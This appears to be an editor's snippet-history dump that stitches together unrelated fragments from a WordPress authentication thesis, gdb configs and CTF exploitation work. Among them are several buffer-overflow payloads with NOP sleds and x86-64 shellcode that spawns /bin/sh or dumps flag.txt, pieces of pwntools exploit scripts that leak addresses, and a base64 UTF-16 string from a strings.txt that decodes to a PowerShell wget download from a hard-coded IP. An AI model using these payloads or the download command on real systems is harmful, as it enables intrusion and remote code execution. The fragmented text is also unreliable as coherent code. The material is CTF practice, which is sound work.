d277766e0e518956058886779b4704cd|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2335|1|V|php
		    //if ($check == false){
	//		    echo "Wrong public key";
	 //                   return apply_filters( 'check_password', false, $credentials, $stored_pk, $user_id );
	//	    }
d013d73b8f0c0a9b1eef4b25764f2c5d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2327|2|V|php
		    //return apply_filters( 'check_password', true, $credentials, $stored_pk, $user_id );
4945a800cb6a12be1f3f4d3f0eee34aa|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2336|12|V|php
	            echo " is md5";
1f16c1bf7813ae39fc90d8419d8e132d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2358|6|V|php
		    echo $command;
194aff0a04218fb7f9fd0ae4e49f229e|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2364|9|V|php
	            /* } else{ */
	            /*     $check = false; */
	            /* } */
35efa9f1534411fbecc9951bd062c8c7|file:///home/neo/ccsc/guydebois/shellcode.txt|55|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"`
	
2e85a21cde97f5c5050709c8eda18086|file:///home/neo/ccsc/guydebois/shellcode.txt|59|1|V|text
	\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05
95e460b738496c0bf00634de4f1e5ead|file:///home/neo/ccsc/guydebois/shellcode.txt|57|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
34a05a91ba681a5577f27ed9f5f2bc19|file:///home/neo/ccsc/guydebois/shellcode.txt|50|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x11\x5e\x31\xc9\xb1\x26\x80\x74\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x30\xc1\x30\xda\x30\xc8\x30\xd3\xb1\x47\x30\xda\x30\xc8\xcc\x81\xb1\x0a\x52\x69\x2e\x2e\x72\x69\x69\x2e\x63\x68\x6f\x88\xe2\x30\xc8\x30\xc8\x52\xcc\x81"`
3b124672edf69a18e3992c9aadea8efa|file:///home/neo/ccsc/guydebois/shellcode.txt|2|160|v|text
	\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
856387ba078363156bec72d4588878a6|file:///home/neo/ccsc/wasphive/notes|1|1|V|
	check = Module.cwrap('check', 'number', ['string'], KEY) called for validation
6884b79603b4176ab7dd292e0ed90382|file:///home/neo/ccsc/guydebois/shellcode.txt|2|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90"`
b46778597cb2a5fae67a66c0b0c14c31|file:///home/neo/ccsc/guydebois/shellcode.txt|2|16|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05
234c5d3aa3791a9bc32e2a22339bb837|file:///home/neo/ccsc/heaping/notes|7|1|V|
	probably need to take control of pointer returned by strdup
2a6f78ae618f039dcb1cd4bd36e7b074|file:///home/neo/ccsc/heaping/notes|21|5|V|
	Heap:
	    user1 name: 0x804b0a0
652152414a8ed119580b9b5e32d23379|file:///home/neo/ccsc/heaping/exploit.py|59|1|V|python
	line = io.recvuntil('>')
6c8ebb301584ece659412315b45c5cfa|file:///home/neo/ccsc/heaping/exploit.py|66|1|V|python
	io.sendline('4')
d3dd1ec287ca12f9833c77ea3c21c094|file:///home/neo/ccsc/skeleton.py|23|1|V|python
	if args.D:
	    gdb.attach(r, gdb_args=[''], gdbscript='''
	        b *main
	        ''')
f2da49543229239b507f2fb1be22c92a|file:///home/neo/ccsc/skeleton.py|23|1|V|python
	if args.D:
e8f4b8c891d93c05efe47cb9051c9515|file:///home/neo/ccsc/heaping/exploit.py|56|10|V|python
	if args.D:
	    gdb.attach(io, gdb_args=[''], gdbscript='''
	        b *main
	        ''')
32a6e31b8566c82ffdafa01e5bf411d9|file:///home/neo/ccsc/heaping/exploit.py|60|1|V|python
	io = start()
78132e10bcef600848ce5d73fff1e9b4|file:///home/neo/ccsc/heaping/exploit.py|59|1|V|python
	
	# if args.D:
45b7bc58cb7f072ebdd91a7b59afcb84|file:///home/neo/ccsc/skeleton.py|9|1|V|python
	context.terminal = ['tilix', '-a', 'app-new-session', '-e']
057133e392e8cb704e3bfee424d2444b|file:///home/neo/ccsc/heaping/exploit.py|9|22|v|python
	tilix
7d3ae9489dbefcf42b9cd421336e8c03|file:///home/neo/ccsc/heaping/exploit.py|9|38|v|python
	'-a'
e7a8ea831c57df0fd9faefd6b0856a56|file:///home/neo/ccsc/heaping/exploit.py|9|39|v|python
	'app-new-session',
8c667a475b2789a76fc9e760ea22aea7|file:///home/neo/ccsc/heaping/exploit.py|9|39|v|python
	'-e']
ce04cbef7b1d28245ecc981f896ace96|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|56|252|v|tex
	stored  
866d1673c5fc8c5d98f97c3586889d15|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|56|252|v|tex
	hashed 
db853ec3ecf7fe4adc358085ba37c278|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|63|217|v|tex
	sing
f6def3c542f69a75e42756703e50278e|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|65|808|v|tex
	\textbf{
57a6c738464daeb715fd7b177c9c6798|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|54|225|v|tex
	(for example an Ed25519 public key)
5fcd2cd9c6ec3f343362a949cd888e29|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|55|5|V|tex
	    \item \textbf{Modify the login form to include a random token that will be utilized as a nonce and get signed with the user's private key in order to perform authentication.}
ba08735b9d075aabed4ac3afcbbbd371|file:///home/neo/ccsc/heaping/exploit.py|10|1|V|python
	context.terminal = ['tmux', 'splitw', '-h']
00e2094fcabf4fc7b2d6dd7caf9cadc1|file:///home/neo/ccsc/heaping/exploit.py|77|1|V|python
	log.info("Payload: %s" % payload)
00f4e5788aab6d3546bb433842dbbefc|file:///home/neo/ccsc/pie/exploit.py|66|11|v|python
	Payload
321c3cf486ed509164edec1e1981fec8|file:///home/neo/ccsc/pie/exploit.py|66|27|v|python
	payload
93d97c58bcf4381cda5bc58de927969c|file:///home/neo/ccsc/pie/exploit.py|69|1|V|python
	log.info("Received: %#x" % line)
6438c669e0d0de98e6929c2cc0fac474|file:///home/neo/ccsc/pie/exploit.py|70|26|v|python
	line
9b0e08bcd89e9a9c2e02a254e8956634|file:///home/neo/ccsc/pie/exploit.py|68|1|V|python
	leaked = hex(line[:4])
3142b76ffac581a93c3acc2a081e1d27|file:///home/neo/ccsc/pie/exploit.py|79|10|v|python
	toHex(line)
0d307dc0e43b9b00e86cae7eb43bf7ff|file:///home/neo/ccsc/pie/exploit.py|80|1|V|python
	log.info("Received: %s" % line)
bfeac7ce3a2ef77a1df57b8fc5a835d7|file:///home/neo/ccsc/pie/exploit.py|74|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
e3fc633ded5ac989a77472efdde48933|file:///home/neo/ccsc/pie/exploit.py|76|22|v|python
	Please enter an option from the main menu:
3284d9364d9f3351ef8764e2b8fdcb32|file:///home/neo/ccsc/pie/exploit.py|80|1|V|python
	leaked_addr = toHex(leaked)
c84529e332b15480e6d38843d2b25e05|file:///home/neo/ccsc/pie/exploit.py|81|1|V|python
	log.info("Leaked: %s" % leaked)
e3305ddda19b0d97512330f657615faf|file:///home/neo/ccsc/pie/exploit.py|63|1|V|python
	        hv = hex(ord(ch)).replace('0x', '')
02f931f4560958ad87cc7451940fa948|file:///home/neo/ccsc/pie/exploit.py|84|35|v|python
	.replace('0x', '')
9c509e44db33400b9ffef2157ada8b5a|file:///home/neo/ccsc/pie/exploit.py|84|36|v|python
	packet
6db0b3a6e32659bc2bdc543598df883f|file:///home/neo/ccsc/pie/exploit.py|84|15|v|python
	[int(c,16) for c in leaked[:4]].join()
89a66193633abf02e2c49f8a3e807ecd|file:///home/neo/ccsc/pie/exploit.py|84|1|V|python
	leaked_addr = int(leaked[:4], 16)
3f27559b6e0a65d3fa8f2614ffdc3ea1|file:///home/neo/ccsc/pie/exploit.py|84|51|v|python
	array_alpha
1057db29a40923bced1def303ec2131d|file:///home/neo/ccsc/pie/exploit.py|84|1|V|python
	leaked_addr = ''.join('{:02x}'.format(x) for x in leaked[:4])
7c92da66bd7fc07ff0abc9126fbf7617|file:///home/neo/ccsc/pie/exploit.py|30|24|v|python
	gdbscript=gdbscript
d15a8864aeb70e856cca38b7f5524cce|file:///home/neo/ccsc/guydebois/sol.py|24|19|v|python
	gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
578fc79269435aaa742963208092d5ea|file:///home/neo/ccsc/pie/exploit.py|29|1|V|python
	    if args.GDB:
	        gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	        b *main 
	        ''')
00418b4d0dd98429166161b263f4383a|file:///home/neo/ccsc/pie/exploit.py|26|9|V|python
	        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
f943b611de6e3fb9b9f416b83c35e1bd|file:///home/neo/ccsc/pie/exploit.py|21|5|V|python
	    if args.GDB:
a78abbbbf6aa028d2252469f35c2ffb3|file:///home/neo/ccsc/pie/exploit.py|21|1|V|python
	    if args.GDB:
	        return gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	        b *main 
	        ''')
6c0a73b8dd149069c63bda38f6d47f38|file:///home/neo/ccsc/pie/exploit.py|21|1|V|python
	    if args.GDB:
	        return gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
4beed035d04a25caf2ddd107c5c8f83a|file:///home/neo/ccsc/pie/exploit.py|22|9|v|python
	eturn 
19fd210dd3d379cb61dac3c0f355c270|file:///home/neo/ccsc/pie/exploit.py|20|1|V|python
	    '''Execute the target binary locally'''
efdba9d12f3433066bf3713391969d07|file:///home/neo/ccsc/pie/exploit.py|20|5|V|python
	    else:
915e375d95d78bf040a2e054caadfb56|file:///home/neo/ccsc/pie/exploit.py|26|13|v|python
	attach
f9aa9edc8b4a9e50625aa1eb7d0265d5|file:///home/neo/.gdbinit|1|1|V|gdb
	source /home/neo/.gdbinit-gef.py
b150b8e2153fd9179d9a0a0d5f2d0d17|file:///home/neo/.gdbinit.old|1|1|V|gdb
	source /home/neo/pwndbg/gdbinit.py
4a17c6f918e4d3fc71d2a73ae3271e60|file:///home/neo/.gdbinit|11|1|V|gdb
	source ~/.gdbinit_pwndbg
4858dab5b4ac16ad2b7d274698c2532a|file:///home/neo/.gdbinit|9|8|v|gdb
	/home
daf31e9e94c493a199a3174b8882d29c|file:///home/neo/ccsc/pie/exploit.py|26|52|v|python
	pwndbg
ad42f6697b035b7580e4fef93be20b4d|file:///home/neo/ccsc/pie/exploit.py|26|13|v|python
	debug
c282c68e9977258f99bd4d7ae73a0bf5|file:///home/neo/ccsc/pie/exploit.py|25|1|V|python
	    if args.GDB:
	        gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	        b *main 
	        ''')
afddacaec3cab852a9edbe9a6f598411|file:///home/neo/ccsc/pie/exploit.py|74|5|V|python
	if args.GDB:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	    b *main 
	    ''')
4056183d1f193c3673c8e29c8ca98f53|file:///home/neo/ccsc/pie/exploit.py|70|1|V|python
	if args.GDB:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	    entry-break
	    b *main 
	    ''')
fad58de7366495db4650cfefac2fcd61|file:///home/neo/ccsc/pie/exploit.py|73|8|v|python
	main
1e73abda556dc4fa000dc1af7a192308|file:///home/neo/ccsc/pie/exploit.py|75|5|V|python
	    b *put_pie+85
03bd84f2b9be0ee8b1543b7fff60b294|file:///home/neo/ccsc/pie/exploit.py|69|5|V|python
	    b *put_pie 
197a2c14015a83c861f11fa81d010a2d|file:///home/neo/ccsc/pie/exploit.py|68|5|V|python
	    entry-break
102f9fe840b5b831ceba3a6056114319|file:///home/neo/ccsc/pie/exploit.py|68|1|V|python
	    pie breakpoint put_pie
44fca1acf88b52d1bc7965dea3dfd77e|file:///home/neo/ccsc/pie/exploit.py|68|20|v|python
	put_pie
f78e29e9796533843b1e540f41be1274|file:///home/neo/ccsc/pie/exploit.py|77|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
2378ea9e577f1695deb0ef75d0790623|file:///home/neo/ccsc/pie/exploit.py|77|1|V|python
	io.sendline('2')
139a3963c84b456178abb81d17fb599b|file:///home/neo/ccsc/pie/exploit.py|68|4|V|python
	    pie breakpoint print_pie
cf53a0f32eb15248863b073db5b70580|file:///home/neo/ccsc/pie/exploit.py|51|1|V|python
	PRINT_PIE_OFFSET = 0x000006dd
1045a9d24e8b7b7a3111ae07c732e814|file:///home/neo/ccsc/pie/exploit.py|89|1|V|python
	log.info("Leaked addr: %#x" % leaked_addr)
d5ed7b473202d9515d8e5cbb0b4f66b3|file:///home/neo/ccsc/pie/exploit.py|90|11|v|python
	Leaked
afa2b09e7480c6d466e15a4dab12187e|file:///home/neo/ccsc/pie/exploit.py|90|29|v|python
	leaked_addr
12b2c285ed769764b97639dfbf1edc5a|file:///home/neo/ccsc/pie/exploit.py|103|1|V|python
	io.interactive()
be485fdad66ffab875f847ba2db2c656|file:///home/neo/ccsc/pie/exploit.py|92|1|V|python
	io.sendline('3')
e6c05a340003670a03e10435d8e05591|file:///media/neo/Storage/ctf/ctf-tools/pwntools/install|4|11|v|sh
	pip install --upgrade appdirs
ed2462dd057a3077d87abd32dc6b3e85|file:///media/neo/Storage/ctf/ctf-tools/pwntools/install|5|11|v|sh
	pip install --upgrade -e pwntools
f3ea6f0f271a0bc3fd7d2ba5da052f32|file:///home/neo/ccsc/pie/exploit.py|91|1|V|python
	log.info("Base addr: %#x" % base_addr)
51616c8fb2fb28bfdf0ff4a3f9aa77fb|file:///home/neo/ccsc/pie/exploit.py|95|11|v|python
	Base addr
29303c162a3c1b6ee111a757b1e94ede|file:///home/neo/ccsc/pie/exploit.py|95|26|v|python
	base_addr
829060ea57da2cc013316d24241bb6b9|file:///home/neo/ccsc/pie/exploit.py|94|1|V|python
	offset = cyclic_find(0x6f616161)
a61351e4da4964781bfe910197d86406|file:///home/neo/ccsc/pie/exploit.py|94|1|V|python
	log.info("Offset: %#x" % offset)
dd35dd5b5cb990da3f52042c01f8bc70|file:///home/neo/ccsc/pie/exploit.py|77|1|v|python
	print_pie_off
64f2218ddb0a783735dd20ab04b5b103|file:///home/neo/ccsc/pie/exploit.py|78|1|V|python
	log.info("Print pie offset: %#x" % PRINT_PIE_OFFSET)
d1e0755077db981439884f205fe17ac7|file:///home/neo/ccsc/pie/exploit.py|80|11|v|python
	Print pie offset
1acac3dcfb6e137f1a2a3b227ccdd27c|file:///home/neo/ccsc/pie/exploit.py|80|1|V|python
	log.info(": %#x" % PRINT_PIE_OFFSET)
950e4d887549d209deca48a47f97d70d|file:///home/neo/ccsc/pie/exploit.py|80|33|v|python
	PRINT_PIE_OFFSET
b7a52cafeed601458925d888cadad356|file:///home/neo/ccsc/pie/exploit.py|77|36|V|python
	PRINT_PIE_OFFSET = exe.sym.print_pie
	log.info("Print pie offset: %#x" % PRINT_PIE_OFFSET)
593616de15330c0fb2d55e55410bf994|file:///home/neo/ccsc/pie/exploit.py|79|9|v|python
	base
7fdee541666195799e61ebb10bfe63b8|file:///home/neo/ccsc/pie/exploit.py|79|3|v|python
	binsh
92d91a394a2748c3621dbb8d90b99dff|file:///media/neo/Storage/ctf/john-1.9.0-jumbo-1/doc/INSTALL-UBUNTU|90|1|V|
	    ./configure && make -s clean && make -sj4
dd185f26228266409144bbd6e8dc792c|file:///media/neo/Storage/ctf/john-1.9.0-jumbo-1/doc/INSTALL-UBUNTU|102|1|V|
	    sudo make shell-completion
996d226dc41580eb12a1f6133f1152d4|file:///media/neo/Storage/ctf/john-1.9.0-jumbo-1/doc/INSTALL-UBUNTU|24|1|V|
	    sudo apt-get -y install build-essential libssl-dev git zlib1g-dev
b7add486b55f7f5dd6d09fa318d30718|file:///home/neo/ccsc/royal-huntsman/strings.txt|1118|1|V|text
	cc~bb~bb~bb~bb}aa}aa|``|``{__{__{__z^^z^^z^^z^^z^^z^^z^^z^^|``|``}aa}aa~bb
	iq~ht~ht~ht~ht~ht~ht~ht~ht~ht~ht~ht~ht~ht~ht~ht~ht
	}m~}m~|l}|l}|l}|l}{k|zj{zj{yizyizyizyizxhyxhywgxwgxvfwvfwtdutdutdutdutdutdutdureuncwlcwlcwlcwlcwlcwlcwlcwjaujaujaujaujaujaujaulbsm_qo_po_po_po_po_po_po_po_po_pn^on^om]nl\ml\ml\ml\ml\mm]nm]nn^oo_po_po_pn^on^on^on^on^on^on^on^or]sr]sr]sr]sr]sr]sr]sr]ss^ts^ts^ts^ts^ts^ts^ts_r{bv{cu{cu{cu{cu{cu{cu{cu{cu{cuzbtzbtyasx`rx`rx`rz^qz^qz^qz^qz^qz^qz^qz^q{_r{_r{_r{_r{_r{_r{_r{`p{`p{ao{ao|bp}cq}cq~dr~dr~dr~dr
	xe~vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|xd{{ex}ew|dv|dv{cuzbtzbtzbtyasx`rw_qv^pu]ot\ns[ms\kv[kv\jv\jw]kx^lx^ly_my_my_my_my_mz`n{ao{ao|bp|bp
	hv}ft{drzcq{ao{ao{ao{ao{ao{ao{ao{ao|bp}cq}cq~dr~dr
	cc~bb~bb~bb~bb}aa|``|``{__{__{__{__{__{__{__{__{__{__}aa}aa}aa~bb
	iq~ht~ht~ht~ht~ht~ht~ht~ht
	}m~}m~}m~}m~|l}|l}{k|zj{zj{zj{zj{yizyizxhyxhywgxwgxwgxuevuevuevuevuevuevuevsfvncwlcwlcwlcwlcwlcwlcwlcwjaujaujaujaujaujaujaulbsm_qo_po_po_po_po_po_po_po_po_pn^on^om]nl\ml\ml\mm]nm]nm]nn^oo_po_pp`qp`qn^on^on^on^on^on^on^on^or]sr]sr]sr]sr]sr]sr]sr]ss^ts^ts^ts^ts^ts^ts^ts_rzauzbtzbtzbtzbtzbtzbtzbt{cu{cuzbtzbtyasx`rx`rx`rz^qz^qz^qz^qz^qz^qz^qz^q{_r{_r{_r{_r{_r{_r{_r{`p{`p{ao{ao|bp}cq}cq~dr~dr~dr~dr
	xe~vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|vc|xd{{ex}ew}ew|dv|dv{cu{cuzbtx`rx`rw_qv^pt\ns[mrZlr[jv[kv\jv\jw]kx^lx^ly_my_mx^lx^ly_my_mz`n{ao{ao{ao
	hv}ft{drzcq{ao{ao{ao{ao{ao{ao{ao{ao|bp}cq}cq~dr~dr
	cc~bb~bb}aa|``|``|``|``|``|``|``|``|``|``|``}aa~bb~bb
82e89e99fcd99384b9b49ad223be13ea|file:///home/neo/ccsc/royal-huntsman/strings.txt|582976|120|v|text
	cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIgB3AGcAZQB0ACAAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADIANQAuADIANQAwADoANQAwADAAMAAvADMAMgBjADEAZQBiADMAYQA2ADAANQBmADQAMAAwADYAMwA3ADAAZQBiADIAMAAyADgAZgA0ADQAMwA4ADkANQA1ADIAZQAzADUAMAA3AGYALwBUAGgAMwBXADEAdABjAGgARQBSAC8AUwB0AHIAMQBHAGEAIAAtAG8AdQB0AGYAaQBsAGUAIABmAGwAYQBnAC4AdAB4AHQAOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AcwAgADYAMAAwACIA
aa4bd85a52736c3d5711de45c26a6488|file:///home/neo/ccsc/royal-huntsman/strings.txt|30278|1|V|text
	NORMALPRISEQUENCENUMBER
81fa798e5ae81923ed4f93cae5a28498|file:///home/neo/ccsc/royal-huntsman/strings.txt|30278|1|V|text
	29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM5NzI2PC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0Pjg0NzM4MDAwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+ODQ3MzgxOTk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57ZTgzOGQ5NDMtNjNlZC00YTBiLTlmYjEtNDcxNTI5MDhhY2M5fTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zOTcyNzwvcGtjOlBhcnROdW1iZXI+DQoJCQk8cGtjOkV1bGFUeXBlPlJldGFpbDwvcGtjOkV1bGFUeXBlPg0KCQkJPHBrYzpJc1ZhbGlkPnRydWU8L3BrYzpJc1ZhbGlkPg0KCQkJPHBrYzpTdGFydD44NDczODIwMDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjg0NzM4Mjk5OTwvcGtjOkVuZD4NCgkJPC9wa2M6S2V5UmFuZ2U+PHBrYzpLZXlSYW5nZT4NCgkJCTxwa2M6UmVmQWN0Q29uZmlnSWQ+e2IxMTg0OTgyLWE5NTgtNDY0My04ZTY2LTQ0NWZhMGY5MjgzMn08L3BrYzpSZWZBY3RDb25maWdJZD4NCgkJCTxwa2M6UGFydE51bWJlcj5YMTUtMzk3Mjg8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5SZXRhaWw8L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NCgkJCTxwa2M6U3RhcnQ+OTI4MTE0NDAwPC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD45MjgxMTYzOTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPntiMTE4NDk4Mi1hOTU4LTQ2NDMtOGU2Ni00NDVmYTBmOTI4MzJ9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM5NzI5PC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0PjkyODExNjQwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+OTI4MTE3Mzk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57MmU3ZDA2MGQtNDcxNC00MGYyLTk4OTYtMWU0ZjE1YjYxMmFkfTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zOTczMDwvcGtjOlBhcnROdW1iZXI+DQoJCQk8cGtjOkV1bGFUeXBlPlJldGFpbDwvcGtjOkV1bGFUeXBlPg0KCQkJPHBrYzpJc1ZhbGlkPnRydWU8L3BrYzpJc1ZhbGlkPg0KCQkJPHBrYzpTdGFydD44OTEyNzQwMDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjg5MTI3Njk5OTwvcGtjOkVuZD4NCgkJPC9wa2M6S2V5UmFuZ2U+PHBrYzpLZXlSYW5nZT4NCgkJCTxwa2M6UmVmQWN0Q29uZmlnSWQ+ezJlN2QwNjBkLTQ3MTQtNDBmMi05ODk2LTFlNGYxNWI2MTJhZH08L3BrYzpSZWZBY3RDb25maWdJZD4NCgkJCTxwa2M6UGFydE51bWJlcj5YMTUtMzk3MzE8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5SZXRhaWw8L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NCgkJCTxwa2M6U3RhcnQ+ODkxMjc3MDAwPC9wa2M6U3RhcnQ+DQoJCQk8cGtjOkVuZD44OTEyNzc5OTk8L3BrYzpFbmQ+DQoJCTwvcGtjOktleVJhbmdlPjxwa2M6S2V5UmFuZ2U+DQoJCQk8cGtjOlJlZkFjdENvbmZpZ0lkPnthYzk2ZTFhOC02Y2M0LTQzMTAtYTRmZi0zMzJjZTc3ZmI1Yjh9PC9wa2M6UmVmQWN0Q29uZmlnSWQ+DQoJCQk8cGtjOlBhcnROdW1iZXI+WDE1LTM5NzMyPC9wa2M6UGFydE51bWJlcj4NCgkJCTxwa2M6RXVsYVR5cGU+UmV0YWlsPC9wa2M6RXVsYVR5cGU+DQoJCQk8cGtjOklzVmFsaWQ+dHJ1ZTwvcGtjOklzVmFsaWQ+DQoJCQk8cGtjOlN0YXJ0Pjk1NTA0MTQwMDwvcGtjOlN0YXJ0Pg0KCQkJPHBrYzpFbmQ+OTU1MDUxMzk5PC9wa2M6RW5kPg0KCQk8L3BrYzpLZXlSYW5nZT48cGtjOktleVJhbmdlPg0KCQkJPHBrYzpSZWZBY3RDb25maWdJZD57YWM5NmUxYTgtNmNjNC00MzEwLWE0ZmYtMzMyY2U3N2ZiNWI4fTwvcGtjOlJlZkFjdENvbmZpZ0lkPg0KCQkJPHBrYzpQYXJ0TnVtYmVyPlgxNS0zOTczMzwvcGtjOlBhcnROdW1iZXI+DQoJCQk8cGtjOkV1bGFUeXBlPlJldGFpbDwvcGtjOkV1bGFUeXBlPg0KCQkJPHBrYzpJc1ZhbGlkPnRydWU8L3BrYzpJc1ZhbGlkPg0KCQkJPHBrYzpTdGFydD45NTUwNzkwMDA8L3BrYzpTdGFydD4NCgkJCTxwa2M6RW5kPjk1NTA4MDk5OTwvcGtjOkVuZD4NCgkJPC9wa2M6S2V5UmFuZ2U+PHBrYzpLZXlSYW5nZT4NCgkJCTxwa2M6UmVmQWN0Q29uZmlnSWQ+ezcxYzdjODUxLTE4NjMtNDIzMi04YWMyLWNkZDdmNWU0NWRhZX08L3BrYzpSZWZBY3RDb25maWdJZD4NCgkJCTxwa2M6UGFydE51bWJlcj5YMTUtMzk3MzQ8L3BrYzpQYXJ0TnVtYmVyPg0KCQkJPHBrYzpFdWxhVHlwZT5SZXRhaWw8L3BrYzpFdWxhVHlwZT4NCgkJCTxwa2M6SXNWYWxpZD50cnVlPC9wa2M6SXNWYWxpZD4NC